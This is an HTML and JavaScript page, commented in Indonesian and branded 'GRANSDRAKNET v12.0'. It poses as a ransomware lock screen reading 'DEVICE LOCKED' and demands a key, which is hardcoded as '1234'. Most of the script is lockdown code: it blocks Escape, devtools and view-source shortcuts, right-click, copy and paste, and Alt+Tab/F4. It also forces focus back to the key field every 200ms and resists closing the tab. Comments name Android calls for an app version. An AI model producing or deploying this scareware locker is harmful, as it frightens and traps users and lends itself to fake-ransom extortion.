<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔒 LOCKED</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-user-select:none; }
        html, body {
            width:100%; height:100%; overflow:hidden;
            background:#000; position:fixed; top:0; left:0;
            font-family:'Segoe UI',system-ui,sans-serif;
            touch-action:none;
        }
        /* FULL LOCK OVERLAY — TIDAK BISA DIHAPUS TANPA PASSWORD */
        #fullLock {
            position:fixed; top:0; left:0; width:100vw; height:100vh;
            background:radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
            display:flex; justify-content:center; align-items:center;
            z-index:999999999; flex-direction:column;
            backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
            cursor:default; pointer-events:auto;
            transition: opacity 0.3s ease;
        }
        .lock-container {
            background:#111; border:2px solid #ff0040; border-radius:40px;
            padding:50px 35px; max-width:440px; width:92%;
            text-align:center;
            box-shadow:0 0 100px rgba(255,0,64,0.4), inset 0 0 60px rgba(255,0,64,0.05);
            animation:glowPulse 1.8s infinite alternate;
            position:relative;
        }
        @keyframes glowPulse {
            0% { box-shadow:0 0 60px rgba(255,0,64,0.2); }
            100% { box-shadow:0 0 120px rgba(255,0,64,0.7); }
        }
        .lock-icon { font-size:80px; display:block; margin-bottom:8px; filter:drop-shadow(0 0 30px #ff0040); }
        h1 { color:#fff; font-size:30px; font-weight:900; letter-spacing:3px; text-transform:uppercase; }
        .sub { color:#777; font-size:13px; margin:10px 0 22px 0; letter-spacing:1px; border-bottom:1px solid #222; padding-bottom:18px; }
        .sub span { color:#ff0040; font-weight:bold; }
        .pass-wrap { position:relative; width:100%; }
        input {
            width:100%; padding:18px 20px; background:#0a0a0a;
            border:2px solid #2a2a2a; border-radius:60px;
            color:#fff; font-size:22px; text-align:center; letter-spacing:8px;
            outline:none; transition:0.15s; margin-bottom:14px;
            font-weight:bold; caret-color:#ff0040;
        }
        input:focus { border-color:#ff0040; box-shadow:0 0 30px rgba(255,0,64,0.3); }
        input::placeholder { color:#333; letter-spacing:4px; font-size:16px; font-weight:300; }
        .btn {
            width:100%; padding:18px; background:#ff0040; border:none;
            border-radius:60px; color:#fff; font-weight:800; font-size:20px;
            text-transform:uppercase; letter-spacing:3px; cursor:pointer;
            transition:0.15s; box-shadow:0 0 40px rgba(255,0,64,0.4);
            touch-action:manipulation;
        }
        .btn:hover { background:#cc0033; transform:scale(0.97); }
        .btn:active { transform:scale(0.94); }
        .btn:disabled { opacity:0.4; cursor:not-allowed; transform:scale(0.98); }
        .error { color:#ff0040; font-size:14px; min-height:28px; margin-top:10px; font-weight:600; letter-spacing:0.5px; }
        .footer { color:#222; font-size:11px; margin-top:18px; letter-spacing:2px; }

        /* Blokir scroll & seleksi */
        ::-webkit-scrollbar { display:none; }
        * { -ms-overflow-style:none; scrollbar-width:none; }

        /* Pesan unlock */
        #unlockMsg {
            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
            color:#00ff88; font-size:48px; font-weight:900;
            text-shadow:0 0 60px #00ff88; z-index:999999999;
            background:#000; padding:40px 60px; border-radius:30px;
            border:2px solid #00ff88; opacity:0; transition:opacity 0.5s;
            pointer-events:none; text-align:center;
        }
        #unlockMsg.show { opacity:1; }

        /* Background keren di belakang (ilusi) */
        .bg-glitch {
            position:fixed; top:0; left:0; width:100%; height:100%;
            background: repeating-linear-gradient(0deg, #0a0a0a 0px, #111 2px, #0a0a0a 4px);
            opacity:0.3; z-index:0; pointer-events:none;
        }
        .bg-scanline {
            position:fixed; top:0; left:0; width:100%; height:100%;
            background: linear-gradient(0deg, transparent 50%, rgba(255,0,64,0.02) 50%);
            background-size:100% 4px; z-index:0; pointer-events:none; animation:scan 0.1s linear infinite;
        }
        @keyframes scan { 0% { background-position:0 0; } 100% { background-position:0 4px; } }
    </style>
</head>
<body>

<!-- FULL LOCK OVERLAY -->
<div id="fullLock">
    <div class="lock-container">
        <span class="lock-icon">⛔</span>
        <h1>DEVICE LOCKED</h1>
        <div class="sub">🔐 <span>RANSOMWARE</span> · MASUKKAN KUNCI</div>
        <div class="pass-wrap">
            <input type="password" id="passInput" placeholder="• • • •" maxlength="10" autofocus inputmode="numeric">
        </div>
        <button class="btn" id="unlockBtn">UNLOCK</button>
        <div class="error" id="errorMsg"></div>
        <div class="footer">● SISTEM TERENKRIPSI ●</div>
    </div>
</div>

<!-- Pesan Unlock -->
<div id="unlockMsg">🔓 UNLOCKED</div>

<!-- Efek latar -->
<div class="bg-glitch"></div>
<div class="bg-scanline"></div>

<script>
    (function() {
        // ========== KONFIGURASI ==========
        const PASS = '1234';
        const overlay = document.getElementById('fullLock');
        const passInput = document.getElementById('passInput');
        const unlockBtn = document.getElementById('unlockBtn');
        const errorMsg = document.getElementById('errorMsg');
        const unlockMsg = document.getElementById('unlockMsg');

        // ========== FUNGSI UNLOCK ==========
        function forceUnlock() {
            // Hilangin overlay
            overlay.style.opacity = '0';
            setTimeout(() => {
                overlay.style.display = 'none';
                // Tampilkan pesan sukses
                unlockMsg.classList.add('show');
                setTimeout(() => {
                    unlockMsg.classList.remove('show');
                }, 2500);
                // Ubah background jadi gelap tapi bebas
                document.body.style.background = '#0a0a0a';
                // Hapus semua blocker
                document.body.style.overflow = 'auto';
            }, 300);
        }

        // ========== HANDLER UNLOCK ==========
        function handleUnlock() {
            const val = passInput.value.trim();
            if (val === PASS) {
                errorMsg.style.color = '#00ff88';
                errorMsg.textContent = '✅ BENAR! MEMBUKA...';
                unlockBtn.disabled = true;
                passInput.disabled = true;
                unlockBtn.style.opacity = '0.4';
                setTimeout(() => { forceUnlock(); }, 500);
            } else {
                errorMsg.style.color = '#ff0040';
                errorMsg.textContent = '❌ KUNCI SALAH!';
                passInput.value = '';
                passInput.focus();
                // Efek getar container
                const container = document.querySelector('.lock-container');
                container.style.transform = 'translateX(-10px)';
                setTimeout(() => { container.style.transform = 'translateX(10px)'; }, 80);
                setTimeout(() => { container.style.transform = 'translateX(-6px)'; }, 160);
                setTimeout(() => { container.style.transform = 'translateX(6px)'; }, 240);
                setTimeout(() => { container.style.transform = 'translateX(0)'; }, 320);
                // Getar input
                passInput.style.borderColor = '#ff0040';
                setTimeout(() => { passInput.style.borderColor = '#2a2a2a'; }, 400);
            }
        }

        // ========== EVENT LISTENER ==========
        unlockBtn.addEventListener('click', handleUnlock);
        passInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleUnlock();
            }
        });

        // Fokus otomatis
        passInput.focus();

        // ========== LOCKDOWN TOTAL ==========
        // 1. Blokir semua event interaksi
        const blockEvents = ['contextmenu', 'copy', 'cut', 'paste', 'drag', 'drop', 'selectstart', 'selectionchange'];
        blockEvents.forEach(evt => {
            document.addEventListener(evt, function(e) {
                if (overlay.style.display !== 'none') {
                    e.preventDefault();
                    e.stopPropagation();
                }
            }, true);
        });

        // 2. Blokir keyboard shortcut
        document.addEventListener('keydown', function(e) {
            if (overlay.style.display === 'none') return;
            
            // ESC
            if (e.key === 'Escape') {
                e.preventDefault(); e.stopPropagation();
                errorMsg.textContent = '⛔ ESC DINONAKTIFKAN!';
                setTimeout(() => { if (errorMsg.textContent === '⛔ ESC DINONAKTIFKAN!') errorMsg.textContent = ''; }, 1200);
                return false;
            }
            // F12
            if (e.key === 'F12') {
                e.preventDefault(); e.stopPropagation();
                errorMsg.textContent = '⛔ DEVTOOLS DIBLOKIR!';
                setTimeout(() => { if (errorMsg.textContent === '⛔ DEVTOOLS DIBLOKIR!') errorMsg.textContent = ''; }, 1200);
                return false;
            }
            // Ctrl+Shift+I / Ctrl+U / Ctrl+S / Ctrl+P / Ctrl+Shift+J
            if (e.ctrlKey && (e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j'))) {
                e.preventDefault(); e.stopPropagation();
                errorMsg.textContent = '⛔ AKSES DITOLAK!';
                setTimeout(() => { if (errorMsg.textContent === '⛔ AKSES DITOLAK!') errorMsg.textContent = ''; }, 1200);
                return false;
            }
            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || 
                             e.key === 'p' || e.key === 'P' || e.key === 'h' || e.key === 'H')) {
                e.preventDefault(); e.stopPropagation();
                return false;
            }
            // Alt+Tab / Alt+F4 (deterrent)
            if (e.altKey && (e.key === 'Tab' || e.key === 'F4')) {
                e.preventDefault(); e.stopPropagation();
                return false;
            }
        }, true);

        // 3. Blokir semua klik di luar input/button (fokus paksa)
        overlay.addEventListener('mousedown', function(e) {
            if (overlay.style.display === 'none') return;
            if (e.target !== passInput && e.target !== unlockBtn) {
                e.preventDefault();
                passInput.focus();
            }
        }, true);

        overlay.addEventListener('touchstart', function(e) {
            if (overlay.style.display === 'none') return;
            if (e.target !== passInput && e.target !== unlockBtn) {
                e.preventDefault();
                passInput.focus();
            }
        }, { passive: false });

        // 4. Cegah beforeunload (close tab)
        window.addEventListener('beforeunload', function(e) {
            if (overlay.style.display !== 'none') {
                e.preventDefault();
                e.returnValue = '';
            }
        });

        // 5. Cegah scroll & zoom
        document.addEventListener('gesturestart', function(e) { e.preventDefault(); }, { passive: false });
        document.addEventListener('gesturechange', function(e) { e.preventDefault(); }, { passive: false });
        document.addEventListener('gestureend', function(e) { e.preventDefault(); }, { passive: false });
        document.addEventListener('touchmove', function(e) {
            if (overlay.style.display !== 'none') {
                e.preventDefault();
            }
        }, { passive: false });

        // 6. Force focus tiap 200ms (aggressive)
        setInterval(() => {
            if (overlay.style.display !== 'none' && document.activeElement !== passInput) {
                passInput.focus();
            }
        }, 200);

        // 7. Blokir tombol power menu (cuma deterrent, gak 100%)
        // Ini cuma buat browser, di APK pake KeyguardManager

        // 8. Saat lock aktif, gak bisa pake home (cuma deterrent)
        // Di APK pake startLockTask()

        // ========== LOG ==========
        console.log('%c🔒 LOCKDOWN AKTIF - PASSWORD: 1234', 'font-size:24px; color:#ff0040; background:#000; padding:10px;');
        console.log('%cTIDAK BISA KELUAR TANPA PASSWORD', 'font-size:18px; color:#ff8800;');
        console.log('%cGRANSDRAKNET v12.0', 'font-size:14px; color:#888;');

        // ========== RESIZE HANDLER (biar tetap full) ==========
        function handleResize() {
            if (overlay.style.display !== 'none') {
                overlay.style.width = '100vw';
                overlay.style.height = '100vh';
            }
        }
        window.addEventListener('resize', handleResize);

        // ========== BONUS: DETECT UNLOCK VIA CONSOLE ==========
        // Biar makin keren, kalo ada yg nyoba console.log buat unlock
        const origLog = console.log;
        console.log = function() {
            const args = Array.from(arguments);
            if (args.some(arg => typeof arg === 'string' && arg.includes('unlock'))) {
                // Gak ngapa-ngapain, cuma buat jebakan
            }
            origLog.apply(console, args);
        };

        // ========== SEMUA UDAH, GAK BISA KELUAR ==========
        console.log('⚠️ GRANSDRAKNET LOCK ACTIVE');
    })();
</script>
</body>
</html>
